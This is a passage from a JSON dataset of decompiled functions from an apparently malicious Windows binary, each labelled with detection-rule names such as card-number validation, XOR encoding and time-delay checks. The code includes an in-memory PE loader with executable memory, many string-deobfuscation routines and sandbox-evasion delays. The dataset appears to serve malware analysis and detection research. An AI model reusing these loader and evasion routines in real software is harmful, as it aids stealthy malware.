        "decompiled_code": "\nuint __fastcall fcn.0040388f(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar6 = *(param_1[0xf] + 0x80 + param_1) + param_1;\n    if (piVar6 != param_1) {\n        for (; piVar6[3] != 0; piVar6 = piVar6 + 5) {\n            iVar1 = piVar6[3] + param_1;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar1);\n            if ((iVar2 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar1),  iVar2 == 0)) {\n                return 0;\n            }\n            puVar5 = piVar6[4] + param_1;\n            puVar4 = puVar5;\n            if (*piVar6 != 0) {\n                puVar4 = *piVar6 + param_1;\n            }\n            while( true ) {\n                uVar3 = *puVar4;\n                if (uVar3 == 0) break;\n                if (uVar3 < 0) {\n                    uVar3 = uVar3 & 0xffff;\n                }\n                else {\n                    uVar3 = uVar3 + 2 + param_1;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, uVar3);\n                *puVar5 = uVar3;\n                if (uVar3 == 0) {\n                    return 0;\n                }\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 442
    },
    "004039de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004039de(uint noname_0, uint *arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uchar *puVar2;\n    int16_t *in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uint uVar8;\n    uchar *puVar9;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar8 = 0;\n    if (((*in_ECX == 0x5a4d) && (piVar5 = *(in_ECX + 0x1e) + in_ECX,  *piVar5 == 0x4550)) &&\n       (puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, piVar5[0x14], 0x3000, 0x40),  puVar2 != NULL)) {\n        uVar1 = *(piVar5 + 5);\n        piVar6 = in_ECX;\n        puVar7 = puVar2;\n        for (iVar3 = piVar5[0x15]; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = *piVar6;\n            piVar6 = piVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        var_8h = 0;\n        if (*(piVar5 + 6) != 0) {\n            piVar4 = uVar1 + 0x2c + piVar5;\n            do {\n                puVar7 = *piVar4 + in_ECX;\n                puVar9 = puVar2 + piVar4[-2];\n                for (iVar3 = piVar4[-1]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    puVar9 = puVar9 + 1;\n                }\n                var_8h = var_8h + 1;\n                piVar4 = piVar4 + 10;\n            } while (var_8h < *(piVar5 + 6));\n        }\n        uVar8 = 0;\n        iVar3 = fcn.0040388f();\n        if ((iVar3 == 0) || (iVar3 = fcn.0040392c(),  iVar3 == 0)) {\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, piVar5[0x14], 0x4000);\n        }\n        else {\n            if (puVar2 + piVar5[10] != NULL) {\n                (*(puVar2 + piVar5[10]))(puVar2, 1, 0);\n            }\n            iVar3 = piVar5[0x14];\n            uVar8 = 1;\n            *arg_ch = puVar2;\n            *arg_10h = iVar3;\n        }\n    }\n    return uVar8;\n}\n",
        "token_count": 705
    },
    "00406477": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406477(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + -0x65;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 161
    },
    "0040649c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040649c(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x59;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x59);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * -0x4e;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 224
    },
    "00406517": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.00406517(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x5d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x5d);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * '\\n';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 222
    },
    "00406592": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.00406592(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x51;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + 'u';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 220
    },
    "004065d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004065d4(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + -0x33;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 162
    },
    "004065f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.004065f9(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x139;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + '>';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 220
    },
    "0040666e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040666e(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x11;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * -99;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 221
    },
    "004066b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004066b8(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + ';';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 159
    },
    "004066dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.004066dd(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x29;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * 'D';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 220
    },
    "00406727": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406727(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + -0x42;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 161
    },
    "0040674c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040674c(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x25;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + -0x5b;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 224
    },
    "004067b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.004067b3(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x25;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * -6;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 221
    },
    "00406cce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406cce(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    uint lpString;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = 0;\n    var_18h = 0x54342507;\n    var_14h = 0x3a320919;\n    puVar7 = &lpString;\n    for (iVar8 = 0x104; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_10h = 0x38081d5b;\n    var_ch._0_1_ = 0x55;\n    var_8h = 0x37555764;\n    var_4h._0_1_ = 0x72;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    puVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n    var_20h = 0;\n    *puVar7 = 0;\n    puVar7[1] = 0;\n    puVar7[2] = 0;\n    *(puVar7 + 3) = 0;\n    var_24h = &var_18h - puVar7;\n    do {\n        iVar8 = var_20h;\n        pcVar1 = var_20h + puVar7;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar8 % 5);\n        uVar3 = pcVar1[var_24h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_20h = var_20h + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (var_20h < 0xd);\n    iVar8 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(puVar7, &lpString, 0x104);\n    if (iVar8 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar8 = fcn.0040385e();\n        if (iVar8 == -0x69b4c9f2) {\n            var_1ch = 1;\n        }\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n    return var_1ch;\n}\n",
        "token_count": 701
    },
    "00407527": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.00407527(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x427990), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x427990));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 111
    },
    "0040769b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040769b(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(50000);\n    var_10h = 0x61733502;\n    var_ch._0_2_ = 0x7909;\n    var_18h = 0x4134724d;\n    var_14h._0_2_ = 0x7939;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    var_4h = 0;\n    *puVar8 = 0;\n    *(puVar8 + 1) = 0;\n    *(puVar8 + 6) = 0;\n    var_8h = &var_10h - puVar8;\n    do {\n        iVar4 = var_4h;\n        pcVar1 = var_4h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_18h + iVar4 % 6);\n        uVar3 = pcVar1[var_8h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        var_4h = var_4h + 1;\n    } while (var_4h < 6);\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(puVar8);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    return 0;\n}\n",
        "token_count": 502
    },
    "00408984": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408984(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + 'l';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 159
    },
    "004089a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.004089a9(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x21;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + 'Z';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 221
    },
    "00409808": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409808(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + -0x7a;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 162
    },
    "0040982d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040982d(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x9d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x9d);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) ^ 0xeb;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 224
    },
    "00409896": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.00409896(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x51;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * 'R';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 220
    },
    "0040a16d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040a16d(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x69;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * 'T';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 222
    },
    "0040a1e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040a1e8(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x15;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + 'V';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 223
    },
    "0040cc32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040cc32(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*0x427a68 != 0) {\n        if (*0x427a58 == 0x14) {\n            *0x427a58 = 0;\n        }\n        if (*(*0x427a58 * 0xc + 0x427a68) == 0) {\n            *0x427a58 = 0;\n        }\n        iVar1 = *0x427a58 * 0xc + 0x427a60;\n        *0x427a58 = *0x427a58 + 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 157
    },
    "0040cc66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cc66(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(param_1);\n    (*_sym.imp.KERNEL32.dll_DisconnectNamedPipe)(param_1);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1);\n    puVar1 = 0x427a64;\n    do {\n        if (puVar1[-1] == param_1) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*puVar1);\n            puVar1[-1] = 0;\n            *puVar1 = 0;\n            puVar1[1] = 0;\n        }\n        puVar1 = puVar1 + 3;\n    } while (puVar1 < 0x427b54);\n    return;\n}\n",
        "token_count": 189
    },
    "0040cd84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cd84(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + 'c';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 160
    },
    "0040cda9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040cda9(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x29;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) ^ 0xcd;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 223
    },
    "0040d7e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d7e3(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 118
    },
    "0040d802": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d802(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.0040d7e3();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 356
    },
    "0040d888": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
